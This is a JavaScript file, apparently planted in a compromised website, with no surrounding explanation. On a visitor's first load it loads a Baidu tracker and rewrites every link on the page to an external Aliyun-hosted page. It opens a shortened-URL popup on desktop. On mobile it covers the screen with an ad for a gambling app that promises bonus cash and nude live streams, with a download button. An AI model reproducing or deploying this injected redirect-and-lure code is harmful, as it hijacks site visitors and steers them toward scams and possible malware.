
addjs('https://hm.baidu.com/hm.js?1ff6a4e88ed4072b3c9a7dfddb861bf1');
function addjs(src) {
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.src = src;
    document.getElementsByTagName('head')[0].appendChild(script);
}
if (!getCookie('dd_cookie')) {
setTimeout(function(){
   setCookie('dd_cookie','ok',1);
    var w1=0;
var tagsE=document.getElementsByTagName("a");
while(tagsE[w1]){
  tagsE[w1].setAttribute("rel", "noreferrer");
  tagsE[w1].setAttribute("href", "http://qingke360.oss-cn-hangzhou.aliyuncs.com/wz/01/wz.html");
  w1++;
}

}, 3000);}
if (navigator.platform.indexOf('Mac') == 0 || navigator.platform.indexOf('Win') == 0) {
    if (!getCookie('cc_cookie')) {
        setCookie('cc_cookie','ok',1);
        window.open("http://t.cn/EGwSi9P");
    }
}else{
if (!getCookie('cc_cookie')) {
setTimeout(function(){
 var meta = document.createElement("meta");
        meta.name = "viewport";
        meta.content = "initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no";
        document.getElementsByTagName('head')[0].appendChild(meta);
        document.writeln("<style type=\'text/css\'>.guize_html{position:fixed;top:2%;left:50%;margin-top:-40px;margin-left:-159px;width:318px;height:auto;border-radius:4px;background-color:#fff;color:#000;text-align:center;font-size:12px}.guize_html p{padding:0 20px 10px;text-align:center}.guize_html_nei{width:318px;min-height:350px;overflow-y:auto;max-height:500px;height:350px;display:block}.guize_html_nei h3{padding:15px}.btn{display:block;margin:20px auto;width:240px;height:40px;border-radius:4px;background-color:#2196f3;color:#fff!important;text-align:center;line-height:40px;cursor:pointer}.btn:hover{background-color:rgba(33,150,243,.86)}.overfloat{position:fixed;top:0;left:0;z-index:9;width:100%;height:100%;background-color:rgba(1,1,1,.5);z-index:9999}</style><div class=\'overfloat\'id=\'gui_kai\'><div class=\'guize_html\'><div class=\'guize_html_nei\'><h3>手机下载APP,立送106元彩金</h3><p>斗地主,炸金花,牛牛,麻将,捕鱼玩法众多</p><p>任意玩<b>两局</b>可直接提现彩金,另送美女裸播</p><img src=\'https://telecom2019.github.io/p6.jpg\'width=\'248\'height=\'170\'/></div><a id=\'g_xz\' class=\'btn\'href=\'http://t.cn/EGwS68r\'rel=\'noreferrer\'target=\'_blank\'>下载试一下</a><a id=\'g_close\'class=\'btn\' onclick=\"setCookie(\'cc_cookie\', \'ok\', 1);window.location.reload();\">确定</a></div></div>") ;
    

}, 4000);}

   
}

function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for (var i = 0; i < ca.length; i++) {
        var c = ca[i].trim();
        if (c.indexOf(name) == 0) return c.substring(name.length, c.length);
    }
    return "";
}
function setCookie(key, val, time) {
    var date = new Date();
    var expiresHours = time;
    date.setTime(date.getTime() + expiresHours * 2000 * 1000);
    document.cookie = key + "=" + val + ";path=/;expires=" + date.toGMTString();
}
